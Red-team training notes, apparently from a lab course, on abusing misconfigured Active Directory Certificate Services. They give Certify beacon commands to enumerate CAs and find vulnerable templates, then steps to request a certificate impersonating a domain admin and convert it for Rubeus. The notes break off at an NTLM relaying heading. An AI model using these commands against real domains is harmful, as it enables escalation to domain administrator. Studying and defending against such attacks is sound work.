# Active Directory Certificate Services

Active Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI).  This can provide public key cryptography, digital certificates, and digital signature capabilities.  Some practical applications include Secure/Multipurpose Internet Mail Extensions (S/MIME), secure wireless networks, VPN, Internet Protocol security (IPsec), Encrypting File System (EFS), smart card logon, and TLS. Correct implementation can improve the security of an organisation in confidentiality (encryption), integrity (digital signatures), and authentication (associate certificates with computer, user, or device accounts).

Misconfigurations can introduce exploitable security risks, like privilege escalation (even domain user to domain admin) and persistence. This module is derived from a research [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf).

## Finding Certificate Authorities

To find ADCS CAs in a domain or forest, run Certify with the cas parameter. This will output lots of useful information, including the root CA and subordinate CAs:

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

The Cert Chain is useful to note (e.g. ```CN=ca,DC=cyberbotic,DC=io -> CN=sub-ca,DC=dev,DC=cyberbotic,DC=io``` shows that "sub-ca" in the DEV domain is a subordinate of "ca" in the CYBER domain). The output also lists the certificate templates at each CA, as well as some information about which principals are allowed to manage them.

## Misconfigured Certificate Templates

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates. They are designed to be duplicated and configured for specific needs. Misconfigurations within these templates can lead to privilege escalation. Certify can also find vulnerable templates:

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

The following are some possible vulns:

* If ENROLLEE_SUPPLIES_SUBJECT is enabled, the certificate requestor can provide any SAN (subject alternative name).
* The certificate usage has Client Authentication set.
* DEV\Domain Users have enrollment rights, so any domain user may request a certificate.
* If an attacker controlled principal has WriteOwner, WriteDacl or WriteProperty.

If the configuration allows any domain user to request a cert for any other domain user (including a domain admin) and use it for authentication, do this:

1: Request a certificate for nlamb:

    beacon> getuid
    beacon> execute-assembly Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

2: Copy the whole certificate (both private key and cert) and save to cert.pem on Ubuntu. Then use openssl to convert to pfx format:

    ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

3: Convert cert.pfx into a base64 encoded string to use with Rubeus:

    ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

## NTLM Relaying to ADCS HTTP Endpoints

AD CS services support HTTP enrollment methods and even includes a GUI, usually found at http[s]://<hostname>/certsrv.



